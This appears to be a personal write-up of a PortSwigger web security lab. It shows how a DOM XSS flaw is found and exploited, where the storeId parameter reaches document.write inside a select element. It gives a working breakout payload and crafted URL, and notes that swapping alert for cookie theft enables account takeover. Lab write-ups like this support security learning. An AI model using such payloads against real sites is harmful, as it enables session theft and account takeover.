@@ -1,0 +1,76 @@
+================================
+LAB: DOM XSS in document.write sink using source location.search inside a select element
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-25
+Lab URL: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
+Category: DOM-based XSS
+Level: Apprentice
+Objective: Break out of the select element and call the alert function via DOM XSS.
+Description: The stock checker functionality reads location.search and passes the storeId
+             parameter directly into document.write() inside a <select> element, with no
+             sanitization.
+
+[RECONNAISSANCE]
+----------------
+- Navigated to a product page and observed a stock checker widget with a <select> dropdown.
+- Inspected the page source: JS reads storeId from URL via URLSearchParams and writes it
+  directly into a <select> element using document.write().
+- Confirmed user-controlled input lands inside <option selected>[INPUT]</option> with zero
+  filtering.
+
+Relevant JS:
+  var store = (new URLSearchParams(window.location.search)).get('storeId');
+  document.write('<select name="storeId">');
+  if(store) {
+      document.write('<option selected>'+store+'</option>');
+  }
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+- Source: window.location.search (storeId parameter, attacker-controlled)
+- Sink: document.write() — writes raw HTML directly into the DOM parser, no encoding
+- No sanitization or escaping between source and sink.
+- Input lands inside a <select> context → inline script/event handlers ignored by browser
+  inside <select>, so context escape is required before injection.
+
+[EXPLOITATION]
+--------------
+Step 1 — Identify injection point:
+  Appended ?storeId=TEST to a product URL, confirmed "TEST" appeared in <option selected>.
+
+Step 2 — Break out of <select> and inject script:
+  Payload: </select><script>alert(1)</script>
+
+Step 3 — Final URL:
+  https://[lab-id].web-security-academy.net/product?productId=1&storeId=</select><script>alert(1)</script>
+
+Resulting HTML after document.write():
+  <select name="storeId">
+    <option selected></select>      ← closes select context
+    <script>alert(1)</script>       ← executed outside select
+    </option>
+    <option>London</option>
+    ...
+  </select>
+
+Note: document.write() feeds directly into the HTML parser (unlike innerHTML which blocks
+<script> tags), so <script> injected via document.write() executes normally.
+
+[EVIDENCE]
+----------
+- alert(1) dialog triggered in browser after visiting the crafted URL.
+- Lab banner confirmed: "Congratulations, you solved the lab!"
+
+[LESSONS LEARNED]
+-----------------
+- document.write() is a dangerous sink: it writes raw HTML into the parser, making <script>
+  injection effective (unlike innerHTML).
+- XSS context matters: always identify WHERE the input lands before crafting a payload.
+  A payload that works outside a <select> may be silently ignored inside one.
+- Source → Sink with no sanitization = exploitable regardless of how "deep" the sink is.
+- DOM XSS is invisible server-side: no logs, no WAF trigger, harder to detect automatically.
+- Real-world impact: replace alert(1) with cookie theft or keylogger to achieve account
+  takeover on any victim who clicks the crafted URL.
